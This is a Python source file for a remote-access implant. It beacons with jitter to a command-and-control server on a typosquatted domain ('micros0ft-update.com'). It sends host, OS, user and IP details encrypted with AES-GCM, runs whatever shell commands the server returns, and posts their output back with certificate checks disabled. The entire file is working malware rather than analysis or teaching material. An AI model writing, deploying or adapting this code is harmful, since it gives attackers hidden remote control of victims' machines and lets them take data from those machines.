import requests,time, random, subprocess
import socket, platform, os, json, base64, uuid
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


C2_URL          = "https://micros0ft-update.com:5000"
BEACON_INTERVAL = 60
JITTER          = 0.3

# Shared AES-256 key with the server
# MUST be identical to the server!
KEY = bytes.fromhex(
    "0123456789abcdef0123456789abcdef"
    "0123456789abcdef0123456789abcdef"
)
AGENT_ID = str(uuid.uuid4())


def encrypt(data: dict) -> str:
    """Encrypts a dictionary with AES-256-GCM"""
    data_bytes = json.dumps(data).encode()
    nonce = os.urandom(12) 
    cipher = AESGCM(KEY)
    encrypted = cipher.encrypt(nonce, data_bytes, None)
    # base64 encoded nonce + encrypted data
    return base64.b64encode(nonce + encrypted).decode()

def decrypt(data_b64: str) -> dict:
    """Decrypts an AES-256-GCM message"""
    data = base64.b64decode(data_b64)
    nonce   = data[:12]
    encrypted = data[12:]
    cipher  = AESGCM(KEY)
    decrypted = cipher.decrypt(nonce, encrypted, None)
    return json.loads(decrypted)


def execute(command: str) -> str:
    """Executes a shell command and returns the result"""
    try:
        output = subprocess.check_output(
            command,
            shell=True,
            stderr=subprocess.STDOUT,
            timeout=30
        )
        return output.decode("utf-8", errors="ignore")
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output.decode()}"
    except Exception as e:
        return f"Error: {str(e)}"

def beacon_loop():
    """Main beaconing loop"""
    print(f"[*] Agent started - ID: {AGENT_ID}")
    print(f"[*] C2 Server: {C2_URL}")
    print(f"[*] Encryption: AES-256-GCM")

    while True:
        try:
            # Prepare the beacon
            beacon_data = {
                "agent_id" : AGENT_ID,
                "hostname" : socket.gethostname(),
                "os"       : platform.system(),
                "user"     : os.getenv("USER", "unknown"),
                "ip"       : socket.gethostbyname(
                               socket.gethostname()
                             )
            }

            # Encrypt the beacon
            encrypted_beacon = encrypt(beacon_data)

            # Send to C2 server
            response = requests.post(
                C2_URL + "/beacon",
                json={"data": encrypted_beacon},
                timeout=10,
                verify=False
            )

            # Decrypt the response
            response_data = decrypt(response.json()["data"])

            # Is there a command to execute
            command = response_data.get("command")
            if command:
                print(f"[*] Command received: {command}")

                # Execute the command
                output = execute(command)

                # Encrypt and send the result
                result = {
                    "agent_id" : AGENT_ID,
                    "command"  : command,
                    "output"   : output
                }
                encrypted_result = encrypt(result)
                requests.post(
                    C2_URL + "/result",
                    json={"data": encrypted_result},
                    timeout=10,
                    verify=False
                )
                print(f"[+] Result sent")

        except Exception as e:
            print(f"[-] Beacon error: {e}")

        # Wait with jitter
        sleep_time = BEACON_INTERVAL * random.uniform(
            1 - JITTER,
            1 + JITTER
        )
        print(f"[*] Next beacon in {sleep_time:.0f}s")
        time.sleep(sleep_time)

if __name__ == "__main__":
    beacon_loop()